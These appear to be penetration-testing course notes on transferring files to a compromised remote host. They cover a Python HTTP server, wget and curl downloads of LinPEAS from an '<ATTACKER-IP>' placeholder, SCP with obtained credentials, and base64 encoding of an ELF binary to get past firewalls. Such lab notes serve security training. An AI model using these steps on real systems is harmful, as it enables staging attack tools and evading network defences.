

#### python HTTP Server
go into the directory that contains the file we need to transfer and run a Python HTTP server
```shell-session
d1ox@htb[/htb]$ cd /tmp
d1ox@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

---
#### wget

Now that we have set up a listening server on our machine, we can download the file on the remote host
```shell-session
user@remotehost$ wget http://<ATTACKER-IP>:8000/linPEASS

...SNIP...
Saving to: 'LinPEASS'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'LinPEASS' saved [14337/14337]
```

---
#### cURL

```shell-session
 curl http://<ATTACKER-IP>:8000/LinPEASS -o LinPEASS
```

---
#### SCP
granted we have obtained ssh user credentials on the remote host. We can do so as follows:
```shell-session
d1ox@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

---
#### base64

If the remote host may have firewall protections that prevent us from downloading a file. We can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file, and then we can paste the `base64` string on the remote server and decode it.

```shell-session
d1ox@htb[/htb]$ base64 filename -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > filename
```

---
#### Validating File Transfers

To validate the format of a file, we can run the `file` command on it:
```shell-session
user@remotehost$ file filename
filename: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

